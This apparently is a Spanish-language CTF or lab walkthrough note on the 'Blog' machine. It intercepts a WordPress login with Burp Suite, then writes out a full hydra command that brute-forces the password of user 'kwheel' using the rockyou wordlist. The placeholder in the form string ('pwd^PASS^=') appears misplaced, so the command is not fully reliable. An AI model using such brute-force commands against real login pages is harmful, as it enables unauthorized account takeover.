Vemos dos usuarios que estaban en el blog, accederemos al login de php y vemos que los usuarios existen
![[Pasted image 20240530114255.png]]

Como ya tenemos dos usuarios realizaremos un ataque de fuerza bruta con hydra, para ello primero interceptaremos la petición con burpsuit
![[Pasted image 20240530115603.png]]

Mandamos la respuesta al repeater con CTRL + R y deshabilitamos burpsuit
![[Pasted image 20240530120414.png]]

Realizamos el ataque con hydra cambiando los parametros del registro de inicio de sesion, el siguiente comando hace la siguiente función:
- `l`: Para seleccionar el usuario
- `P`: Para seleccionar el listado de contraseñas
- `http-post-form`: Aqui pegaremos el contenido del login interceptado por burpsuit añadiendo después del igual `^PASS` donde queremos obtener las credenciales y al final del apartado después de cookie=1 agregamos :seguido del error que nos da al dar login
```Bash
hydra -l kwheel -P /home/wolf/Escritorio/rockyou.txt 10.10.57.104 http-post-form "/wp-login.php:log=kwheel&pwd^PASS^=&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.57.104%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -I
```
![[Pasted image 20240530135323.png]]

[[MAQUINA BLOG (Smbclient, smbmap, extracción metadatos con steguide, wpscan, vulnerabilidad con metasploit wordpress y escalada de privilegios con pkexec)|MAQUINA BLOG (Smbclient, smbmap, extracción metadatos con steguide, wpscan, vulnerabilidad con metasploit wordpress y escalada de privilegios con pkexec)]]

